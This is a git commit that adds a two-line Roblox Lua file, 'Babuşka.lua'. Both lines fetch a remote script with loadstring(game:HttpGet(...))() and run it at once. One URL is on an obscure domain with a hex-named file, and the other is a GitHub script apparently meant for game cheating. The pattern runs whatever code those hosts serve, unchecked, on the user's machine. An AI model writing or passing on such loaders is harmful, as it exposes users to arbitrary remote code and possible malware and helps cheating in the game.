fbd43c8fbc0bebe5b0fc8e8832eff400e26b9b42
XCOM9J <abbasasbasb@gmail.com>
2024-05-21 01:56:54 +0300

    Create Babuşka.lua

---
+++ Babuşka.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet('https://egorikusa.space/ac014ab3c4294f260c79eafb.lua'))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LegendaryScript/LegendaryScript/main/LegendaryRBXScript.lua", true))()
